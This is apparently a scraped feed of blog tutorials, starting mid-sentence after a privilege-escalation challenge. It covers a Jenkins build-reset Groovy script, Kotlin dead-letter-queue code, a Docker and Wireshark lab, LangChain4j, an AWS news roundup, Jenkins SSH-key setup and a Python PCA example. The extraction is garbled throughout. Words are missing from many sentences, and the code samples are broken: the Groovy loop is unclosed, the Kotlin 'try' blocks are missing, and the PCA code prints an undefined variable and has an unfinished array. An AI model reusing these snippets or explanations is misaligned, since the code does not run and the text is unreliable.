achieving root access.This challenge reinforces the importance of restricting sensitive files, enforcing strong access controls, and reviewing file permissions. Any exposed directory or misconfigured binary can serve as a potential attack vector, leading to severe security breaches if not properly mitigated.

item.title: Resetting Jenkins Build
item.author: Eilony Pearl
item.content:encoded: I recently encountered issues with my Jenkins builds and needed a fresh start. To keep my CI/CD pipeline clean and efficient, I decided to reset the builds. In this guide, I’ll walk you through the exact steps I took to reset Jenkins builds seamlessly and maintain a smooth development workflow.If you’re facing similar challenges, follow along as I share my process for resetting Jenkins builds effectively.Step 1: Logging into JenkinsThe first thing I did was log into my Jenkins server using my credentials.Step 2: Accessing the Script ConsoleI navigated to Manage Jenkins from the dashboard.I scrolled down to the Tools and Actions section and clicked on Script Console.Step 3: Running the ScriptTo reset the build history of my Jenkins project, I executed the following Groovy script in the Script Console:item = Jenkins.instance.getItemByFullName("test-dev")//THIS WILL REMOVE ALL BUILD HISTORYitem.builds.each() { build -> build.delete()item.updateNextBuildNumber(1)item.getNextBuildNumber()Important: I replaced “test-dev” with the actual name of my Jenkins project before executing the script.Resetting my Jenkins builds helped me keep my CI/CD pipeline organized and running efficiently.

item.title: 9 Log Management Scripts for Better Troubleshooting
item.author: Obafemi

item.title: Dead Letter Queues: The Key to Keep Your System Reliable
item.author: Muhammad Taufik Akbar
item.content:encoded: Have you ever sent a package that never reached its destination? Maybe the address was wrong, or the recipient refused it. In distributed systems, messages also need a reliable delivery system. But what happens when a message can’t be processed (for whatever reason)? That’s where a comes in.This article will explain DLQs in simple terms, when to use them (and when not to), different types of DLQs, and the implementation with example in KotlinWhat is a Dead Letter Queue?A is like a lost-and-found box for messages that fail to be processed. It catches messages that couldn’t be delivered or handled correctly.Imagine a messaging system like or where producers send messages and consumers process them. If a message is faulty (for example, it has incorrect data that causes an error when being processed), instead of getting lost or causing the system to crash, it moves to a DLQ for later analysis.: The message has missing or invalid data.The consumer application crashes when handling the message.The system tries multiple times but fails.The message wasn’t processed within the allowed time.When to Use a DLQ (and When Not to): Instead of discarding failed messages, store them for later debugging.: Understand why certain messages fail and improve the system.: Some errors (e.g., temporary database issues) can be fixed and retried later.Avoid blocking the system: Prevent one bad message from stopping the entire queue.For business logic retries: If a failure is expected (e.g., waiting for an external service), handle retries separately.: Not all failures need to be stored. A high volume of failing messages could overwhelm the DLQ.: DLQs should be a temporary holding place, not a database replacement.Different messaging systems handle DLQs differently:1️⃣ RabbitMQ DLQs (Built-in Support). RabbitMQ supports DLQs natively using dead-letter exchanges (DLX), automatically redirecting failed messages to a designated queue.Example: Implementing a RabbitMQ DLQ in Kotlin (Spring Boot)@Configurationclass RabbitMQConfig { const val MAIN_QUEUE = "main.queue" const val DLQ = "dead.letter.queue" } fun mainQueue(): Queue { return QueueBuilder.durable(MAIN_QUEUE) .deadLetterExchange("") .deadLetterRoutingKey(DLQ) .build() fun deadLetterQueue(): Queue { return QueueBuilder.durable(DLQ).build() }RabbitMQ Consumer Handling with DLQ@Component@Slf4jclass RabbitMQConsumer(@Autowired private val rabbitTemplate: RabbitTemplate) { @RabbitListener(queues = [RabbitMQConfig.MAIN_QUEUE]) fun consumeMessage(message: String) { processMessage(message) log.info("Processed message: {}", message) } catch (e: Exception) { log.error("Message failed, sending to DLQ: {}", message, e) rabbitTemplate.convertAndSend(RabbitMQConfig.DLQ, message) } private fun processMessage(message: String) { if (message.contains("error")) throw Exception("Processing failed") log.info("Message has been processed!") }2️⃣ Kafka DLQs (Manual Setup). Unlike RabbitMQ, Kafka does not have a built-in DLQ. Instead, we create a separate topic (e.g., dead-letter-topic) and publish failed messages there for later debugging or retry.Example: Implementing a Kafka DLQ in Kotlin (Spring Boot)@Configurationclass KafkaConfig { const val MAIN_TOPIC = "main-topic" const val DLQ_TOPIC = "dead-letter-topic" } fun mainTopic(): NewTopic { return TopicBuilder.name(MAIN_TOPIC).partitions(3).replicas(1).build() } fun deadLetterTopic(): NewTopic { return TopicBuilder.name(DLQ_TOPIC).partitions(3).replicas(1).build() }Kafka Consumer Handling with DLQ@Component@Slf4jclass KafkaConsumer(@Autowired private val kafkaTemplate: KafkaTemplate<String, String>) { @KafkaListener(topics = [KafkaConfig.MAIN_TOPIC], groupId = "group_id") fun consumeMessage(message: String) { processMessage(message) log.info("Processed message: {}", message) } catch (e: Exception) { log.info("Message failed, sending to DLQ: {}", message) kafkaTemplate.send(KafkaConfig.DLQ_TOPIC, message) } private fun processMessage(message: String) { if (message.contains("error")) throw Exception("Processing failed") log.info("Message has been processed!") }A Dead Letter Queue (DLQ) is an essential mechanism for handling failed messages gracefully. We explored different implementations using RabbitMQ or Kafka in Kotlin (Spring Boot), including handling failed messages and redirecting them to a DLQ.By implementing a DLQ, we ensure fault tolerance, error analysis, and system reliability. Would you use a DLQ in your system? Let me know your thoughts

item.title: ML.NET: Bringing Machine Learning to .NET Developers
item.author: Adem KORKMAZ

item.title: Network Traffic Analysis Using Docker Compose and Wireshark
item.author: Bumi Arya Dirangga
item.content:encoded: Alright, let’s talk about . If you’ve ever wondered how to inspect and understand network traffic in a controlled environment, Docker Compose + Wireshark is the combo you need.This guide will walk you through setting up a , capturing traffic, and analyzing it like a pro. No unnecessary theory — just stuff you can use today. Let’s go!Why Use Docker for Traffic Analysis?You set up a bunch of virtual machines, configure network interfaces, and deal with endless headaches — or you could just use Docker. Why?✅ — No need to spin up full VMs.✅ — Containers create their own network space.✅ — With , you can define and deploy environments in seconds.✅ — No messy manual configurations. Just run a script, and boom — you’re ready to go.We’re going to set up a virtual lab environment using Docker Compose to simulate basic network traffic between a web server and a client, then analyze it with Wireshark.Web Server: Running Nginx to serve HTTP traffic.Client: An Ubuntu-based container to generate HTTP requests.Wireshark installed on the host machine to capture and analyze network traffic.Basic understanding of Docker, Docker Compose, and networking concepts.Docker and Docker Compose installed on your system.Wireshark installed on your host machine.i’m using Docker Desktop from windows 11 and enabled wsl integration, so i work it on wsl.2. Create Project Directorymkdir network-traffic-labcd network-traffic-lab3. Define Docker Compose ConfigurationCreate a file named docker-compose.yml with the following content:version: '3.8'services: image: nginx:latest container_name: web_server networks: client: container_name: client networks: command: bash my_network:4. Start the Docker Compose EnvironmentRun the following command to start the containers:To verify that the containers are running:5. Prepare the Client ContainerAccess the client container’s shell:docker exec -it client bashInside the container, install curl to simulate HTTP requests:apt update && apt install -y curl6. Capture Network Traffic with Wireshark Identify the Docker network interface:Since I’m using Docker Desktop with WSL, there is no docker0 interface as in regular Linux systems. Docker Desktop uses a network based on Windows NAT or the WSL vEthernet adapter for communication. So, I need to install tcpdump in the client container and export it.7. Simulate Network Traffic From the client container’s shell, send HTTP requests to the web server:8. Results and Analysis In Wireshark, filter the captured packets to focus on HTTP traffic using http Examine the packet details:Source/destination IPs (e.g., 172.17.x.x range for Docker’s network).HTTP request/response details (e.g., GET / from client to server).The captured network traffic in Wireshark includes HTTP request and response packets between the client and web server. The observed traffic confirms successful communication between the containers. Screenshots of captured packets illustrate the packet structure, including source and destination IPs, HTTP headers, and payload data.This lab provided hands-on exposure to using Docker Compose and Wireshark. By simulating a real-world client-server interaction, we deepened our understanding of packet structures, HTTP transactions, and TCP/IP operations. Such experiments are invaluable for security professionals, network engineers, and system administrators in diagnosing issues and optimizing network performance. Future work could extend this study to include , , and performance tuning strategies in containerized environments.Have you ever experimented with ? Share your experiences and insights in the comments below! 🚀Oh, and if this helped, hit that clap button(10x)🙌😉.

item.title: Getting Started with LangChain4j: A Beginner’s Guide
item.author: Swapnil Kalbande
item.content:encoded: AI language models are revolutionizing the way we build applications. With LangChain4j, integrating large language models (LLMs) into your Spring Boot application becomes seamless. This guide will help you get started with LangChain4j, set up a Spring Boot project, and build a simple LLM-powered chatbot.LangChain4j is a Java-based library designed to simplify the integration of LLMs like GPT, LLaMA, and others into your applications. It abstracts the complexities of model interaction, provides conversational memory management, and enables the chaining of multiple tasks for more advanced AI workflows.Key Features of LangChain4j: Connect with popular models using APIs.: Efficiently handle prompts for natural language conversations.: Maintain conversation context.: Use external APIs for dynamic results.Before you begin, ensure you have the following installed:Basic knowledge of Spring BootStep 1: Setting Up Your Spring Boot Application1. Create a Spring Boot Project2. Add LangChain4j DependencyAdd the following to your pom.xml file:<dependency> <groupId>dev.langchain4j</groupId> <artifactId>langchain4j-spring-boot-starter</artifactId> <version>1.0.0</version>Step 2: Configure LangChain4jIn your application.properties or application.yml, configure your API key (e.g., using OpenAI GPT):langchain4j.api-key=your-openai-api-keylangchain4j.model=gpt-4Step 3: Build a Simple ChatbotCreate a chatbot service using LangChain4j’s simple interface.import dev.langchain4j.model.chat.ChatLanguageModel;import org.springframework.stereotype.Service;public class ChatService { private final ChatLanguageModel chatLanguageModel; public ChatService(ChatLanguageModel chatLanguageModel) { this.chatLanguageModel = chatLanguageModel; } public String chat(String userMessage) { return chatLanguageModel.generate(userMessage);}import org.springframework.web.bind.annotation.*;@RequestMapping("/chat")public class ChatController { private final ChatService chatService; public ChatController(ChatService chatService) { this.chatService = chatService; @PostMapping public String chat(@RequestBody String message) { return chatService.chat(message);}Step 4: Test Your ChatbotStart your Spring Boot application using:Send a POST request using curl or Postman:curl -X POST http://localhost:8080/chat \-H "Content-Type: application/json" \Congratulations! You’ve built a simple chatbot using LangChain4j. From here, you can enhance your chatbot by adding conversational memory, integrating external APIs, or chaining multiple tasks. Stay tuned for more advanced tutorials!

item.title: AWS Weekly Roundup: AWS Pi Day, Amazon Bedrock multi-agent collaboration, Amazon SageMaker Unified Studio, Amazon S3 Tables, and more
item.author: Prasad Rao
item.content:encoded: This year’s virtual event featured in-depth discussions with Amazon Web Services (AWS) product teams showcasing our continued innovation in helping customers build robust data foundations for analytics and AI workloads.Missed the live event? You can still access all content on-demand at the event page. Whether you’re developing data lakehouses, training AI models, creating generative AI applications, or optimizing analytics workloads, the shared insights will help you maximize the value of your data. Here are some launches that got my attention during the previous week.Amazon Bedrock now supports multi-agent collaboration – With the availability of multi-agent collaboration in Amazon Bedrock, you can create networks of specialized agents that communicate and coordinate under the guidance of a supervisor agent. You can build, deploy, and manage networks of AI agents that work together to execute complex, multi-step workflows efficiently.Amazon SageMaker Unified Studio is now generally available – You can now use Amazon SageMaker Unified Studio as your single data and AI development environment, where you can find and access all of your organization’s data and work using the best tools for your specific needs. With the new simplified permissions management, you can easily bring your existing AWS resources into the unified studio. You’ll be able to find, access, and query your organization’s data and AI assets while collaborating with your team to securely build and share your analytics and AI artifacts—from data and models to generative AI applications.Amazon S3 reduces pricing for S3 object tagging by 35% – Amazon S3 reduces pricing for S3 object tagging by 35% in all AWS Regions to $0.0065 per 10,000 tags per month. Object tags are key-value pairs applied to S3 objects that can be created, updated, or deleted at any time during the lifetime of the object. Here are some of my favorite posts from community.aws. Create your AWS Builder ID to start sharing your tips and connect with fellow builders. Your Builder ID is a universal login credential that gives you access, beyond the AWS Management Console, to AWS tools and resources, including over 600 free training courses, community features, and developer tools such as Amazon Q Developer. Check your calendars and sign up for these upcoming AWS events:AWS Summits – The AWS Summit season is coming along! Join free online and in-person events that bring the cloud computing community together to connect, collaborate, and learn about AWS. Register in your nearest city: Paris (April 9), Amsterdam (April 16), London (April 30), and Poland (May 5).AWS re:Inforce (June 16–18) – Our annual learning event devoted to all things AWS Cloud security in Philadelphia, PA. Registration opens in March, so be ready to join more than 5,000 security builders and leaders.AWS DevDays are free, technical events where developers can learn about some of the hottest topics in cloud computing. DevDays offer hands-on workshops, technical sessions, live demos, and networking with AWS technical experts and your peers. Register to access AWS DevDays sessions on demand.That’s all for this week. Check back next Monday for another Weekly Roundup!This post is part of our Weekly Roundup series. Check back each week for a quick roundup of interesting news and announcements from AWS!(This survey is hosted by an external company. AWS handles your information as described in the AWS Privacy Notice. AWS will own the data gathered via this survey and will not share the information collected with survey respondents.)

item.title: How I Secured servers with Duo MFA: A Must-Have for RDP & SSH Access

item.title: Stop Using Key Pairs! Secure EC2 Access with AWS SSM Manager
item.author: Adnan Rafi

item.title: Configuring Jenkins SSH-Key Agent to Connect to Remote Servers
item.author: Eilony Pearl
item.content:encoded: I recently needed to set up Jenkins to securely connect to remote servers for automated deployments. Instead of using password-based authentication, I decided to configure SSH key-based authentication for better security and efficiency. In this guide, I’ll walk you through the exact steps I followed to get it working seamlessly.Step 1: Generating SSH Keys on the Remote ServerFirst, I logged in to my remote server and generated SSH keys to establish secure authentication.Step 2: Verifying SSH Key GenerationTo confirm that the SSH keys were successfully created, I ran:Here’s what the output looked like:root@server1:~# ls -lh .ssh/total 8.0K-rw - - - - 1 root root 0 Apr 15 06:14 authorized_keys-rw - - - - 1 root root 2.6K Apr 30 01:47 id_rsa-rw-r - r - 1 root root 578 Apr 30 01:47 id_rsa.pubStep 3: Adding the Public Key to the Authorized Keys FileTo allow Jenkins to authenticate without a password, I added my public key to the authorized_keys file:cat .ssh/id_rsa.pub >> .ssh/authorized_keysStep 4: Copying the Private KeySince Jenkins requires the private key to authenticate, I viewed and copied it using:I made sure to store it securely.Step 5: Navigating to Jenkins Credentials ManagerNext, I logged into Jenkins and followed these steps:Scrolled down to Security and clicked Credentials.Under Stores Scoped to Jenkins, I clicked System.Then, under System, I selected Global credentials (unrestricted).Clicked Add Credentials to create a new entry.Step 6: Adding SSH Credentials to JenkinsI filled in the required fields as follows:: SSH Username with Private Key: Global (Jenkins, nodes, items, all child items, etc.): (Chose a unique name for reference): (Used the same as ID for clarity): root (or the appropriate remote server username): Pasted the private key from Step 4After clicking Create, Jenkins successfully stored my SSH credentials.With this setup, I can now securely connect Jenkins to my remote servers for automation without worrying about passwords. It makes deployments smoother and more secure.

item.title: Understanding Principal Component Analysis And Creating it (kinda) With Python
item.author: ishan
item.content:encoded: Principal Component Analysis, or , is a technique used in data analysis to reduce the complexity of data while preserving as much of the important information as possible. It’s often used in machine learning, statistics, and data science to simplify large datasets, find patterns, and make the data easier to analyze and visualize.In this blog, I’ll explain in simple terms, and walk through the two common methods used to calculate PCA:By creating the covariance matrix and then using eigen decomposition.By using Singular Value Decomposition (SVD) to get the components.Imagine you have a large dataset with many features (variables) that describe each data point. For example, let’s say you have a dataset about houses, and the features include the number of rooms, the area, the price, and the location of each house.If you plot all of these features in a graph, you might find that the data is spread out in a complex way. But even though it looks complicated, there’s often a simple underlying structure to the data — for example, house price might depend mostly on area, and the number of rooms might not change much independently of the area.PCA helps simplify the data by identifying the key directions (called ) in which the data varies the most. Instead of working with all the original features, we can project the data onto just a few key directions, reducing the number of features and making the dataset easier to analyze. in the data by identifying the of maximum variation (i.e., the directions along which the data is most spread out).It then by keeping only the most important patterns and discarding the rest.: It simplifies the data by reducing the number of features, which can make machine learning models faster and easier to interpret.: It helps us reduce high-dimensional data (with many features) into two or three dimensions, so we can visualize it more easily.: It helps filter out noisy or irrelevant features in the data.: It allows us to find the most important combinations of features in the data.Two Methods to Calculate PCANow, let’s look at the two common methods to calculate PCA: Covariance Matrix + Eigen Decomposition and Singular Value Decomposition (SVD).Method 1: Using Covariance Matrix and Eigen DecompositionThis method involves a few key steps:First, we standardize the data so that each feature has a mean of zero and a standard deviation of one. This is important because PCA is sensitive to the scale of the features (i.e., the range of values). Without this step, features with larger ranges would dominate the analysis.2. Calculate the Covariance Matrix:The covariance matrix tells us how the features in the data relate to one another. It shows whether two features change in the same direction (positive covariance) or in opposite directions (negative covariance).For a dataset with n features, the covariance matrix will be an n×n matrix that captures the relationships between each pair of features.The next step is to perform an on the covariance matrix. This involves finding the and of the covariance matrix. tell us how much variance (spread) is captured by each principal component. (or eigenvectors corresponding to the largest eigenvalues) tell us the directions (principal components) along which the data has the most variation.4. Sort the Eigenvalues and Eigenvectors:Once you have the eigenvalues and eigenvectors, you sort them in descending order, so the principal components that capture the most variance come first.Finally, you project the data onto the new directions (the eigenvectors), reducing the dimensionality of the dataset while preserving as much variance as possible.We create a to understand how the features relate to each other,Then, we find the (directions) and (importance of those directions) to identify the principal components.Method 2: Using Singular Value Decomposition (SVD)The second method to calculate PCA uses Singular Value Decomposition (SVD). SVD is a technique from linear algebra that decomposes any matrix into three matrices: , , and . This method is more computationally efficient and is often used in practice.Here’s how SVD helps us calculate PCA:We apply SVD to the data matrix A, which has the dimensions m×n, (where m is the number of data points and n is the number of features).The SVD of A gives us three matrices:: Contains the left singular vectors, representing the new coordinates of the data points after transformation.: A diagonal matrix containing the singular values (which are the square roots of the eigenvalues), indicating how much variance is explained by each principal component.: Contains the right singular vectors, which correspond to the principal components (the directions of maximum variance).2. Extract Principal Components:From , we extract the (the directions of maximum variance).The matrix tells us how much variance each of these principal components explains.Finally, to reduce the data’s dimensionality, we project the data onto the selected principal components by multiplying A with the transpose of the principal components matrix. directly gives us the (from V^T) and how much variance each component explains (from Σ).It’s a more computationally efficient way to calculate PCA compared to using the covariance matrix and eigen decomposition.Key Differences Between the Two MethodsCovariance Matrix + Eigen Decomposition:Works by first computing the covariance matrix, which requires calculating pairwise relationships between features.It’s more conceptually intuitive, but might be less efficient for large datasets because you need to compute and store the covariance matrix, which can be large.SVD is more efficient for large datasets because it works directly on the data matrix without needing to explicitly calculate the covariance matrix.It’s computationally more stable and is the method used by most PCA implementations in practice.Here is the code implementation of PCA using SVD:Although it is not in OOP format, it is easy to understand for any beginner.import numpy as np# Sample data matrix (e.g., 4 data points and 3 features)A = np.array([[1, 2, 3], [7, 8, 9],# Step 1: Apply numpy SVDU, Sigma, Vt = np.linalg.svd(A, full_matrices=False)# Step 2: Calculate the squared singular values (variance explained)singular_values_squared = Sigma**2total_variance = np.sum(singular_values_squared)variance_explained_percentage = (singular_values_squared / total_variance) * 100# Step 3: Calculate the cumulative variancecumulative_variance = np.cumsum(variance_explained_percentage)# Step 4: Keep enough components to explain 90% of the variancethreshold = 90 num_components = np.argmax(cumulative_variance >= threshold)# Step 5: Project data onto the first `num_components` principal componentsV_k = Vt[:num_components + 1, :] # V is selected as it is the input space matrix, and we transpose it to match Aprint("Number of components chosen:", num_components)print("Cumulative variance explained:", cumulative_variance)print("Reduced data representation:\n", A_pca)I hope this helps you in learning and understanding PCA, happy coding :)
